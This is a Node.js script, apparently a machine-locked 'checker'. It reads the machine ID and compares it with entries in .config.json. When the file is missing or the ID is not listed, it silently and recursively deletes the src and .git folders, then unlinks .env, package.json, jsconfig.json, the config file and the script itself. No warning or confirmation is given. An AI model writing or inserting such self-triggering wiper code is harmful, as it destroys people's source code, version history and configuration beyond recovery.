const { machineId, machineIdSync } = require("node-machine-id");

const fs = require("fs");
const { isEmpty } = require("lodash");

var filePath = ".config.json";
var folderPath = ["src", ".git"];
const files = [".config.json", ".env", "jsconfig.json", "package.json", "checker.js"];

// delete file
// fs.unlinkSync(filePath);

// remove folder
const deleteFolder = (path) => {
  if (fs.existsSync(path)) {
    try {
      fs.rmdirSync(path, { recursive: true });

      console.log(`${path} is deleted!`);
    } catch (err) {
      // console.error(`: )`);
    }
  }
};

// Syncronous call
let id = machineIdSync();

const isHasFolder = (path) => fs.existsSync(path) && fs.lstatSync(path).isDirectory();

const isHasFile = (path) => fs.existsSync(path) && fs.lstatSync(path).isFile();

if (!isHasFile(filePath)) {
  folderPath.forEach((forder) => deleteFolder(forder));

  if (files.length) files.forEach((filePath) => isHasFile(filePath) && fs.unlinkSync(filePath));
} else {
  let data = fs.readFileSync(filePath, "utf8");
  data = JSON.parse(data);

  if (!data[id] || isEmpty(data)) {
    folderPath.forEach((forder) => deleteFolder(forder));
    if (files.length) files.forEach((filePath) => isHasFile(filePath) && fs.unlinkSync(filePath));
  }
}

async function checker() {
  // create folder
  if (!isHasFolder("hello")) {
    // setTimeout(() => fs.mkdirSync("hello"), 20000);
  }
}

// checker();

const addId = (id) => {
  if (isHasFile(filePath)) {
    let data = fs.readFileSync(filePath, "utf8");
    data = JSON.parse(data);
    if (!data[id]) {
      data[id] = id;
      fs.writeFileSync(filePath, JSON.stringify(data));
    }
  }
};
